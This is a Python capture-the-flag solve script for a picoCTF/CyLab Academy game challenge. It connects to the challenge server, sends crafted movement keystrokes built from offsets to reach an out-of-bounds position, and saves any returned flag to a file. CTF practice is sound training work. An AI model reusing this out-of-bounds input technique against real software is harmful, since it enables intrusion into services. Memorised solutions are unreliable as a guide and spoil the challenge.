import socket, time, re, sys
sys.stdout.reconfigure(encoding="utf-8", errors="replace")

HOST, PORT = "xebec.cylabacademy.net", 27860


def run(offset, tile, total=70):
    y = offset + 90
    keys = bytearray(b"l" + tile)
    keys += b"w" * 4
    keys += (b"d" * (y - 4)) if y >= 4 else (b"a" * (4 - y))
    keys += b"w"
    line = bytes(keys) + b"\n"
    s = socket.create_connection((HOST, PORT), timeout=15)
    s.settimeout(1.0)
    time.sleep(0.5)
    buf = b""
    t0 = time.time(); last = time.time()
    while time.time() - t0 < 6:
        try:
            d = s.recv(65536)
        except socket.timeout:
            if time.time() - last > 0.8:
                break
            continue
        if not d:
            break
        buf += d; last = time.time()
    s.sendall(line)
    out = b""
    closed = False
    t0 = time.time(); last = time.time()
    while time.time() - t0 < total:
        try:
            d = s.recv(65536)
        except socket.timeout:
            if time.time() - last > 5:
                break
            continue
        if not d:
            closed = True
            break
        out += d; last = time.time()
        if re.search(rb"(academy|picoCTF)\{", out):
            break
    s.close()
    allout = buf + out
    pos = re.findall(rb"Player position: (-?\d+) (-?\d+)", allout)
    flag = re.search(rb"(academy|picoCTF)\{[^}]{1,120}\}", allout)
    return {
        "offset": offset, "tile": tile, "maps": len(pos),
        "lastpos": pos[-1] if pos else None,
        "closed": closed, "flag": flag.group(0).decode() if flag else None,
    }


for off in (-40, -39):
    for tile in (b"p", b"]"):
        r = run(off, tile)
        print(r, flush=True)
        if r["flag"]:
            open(r"./_z_bg2_flag.txt", "w").write(r["flag"])
            sys.exit(0)
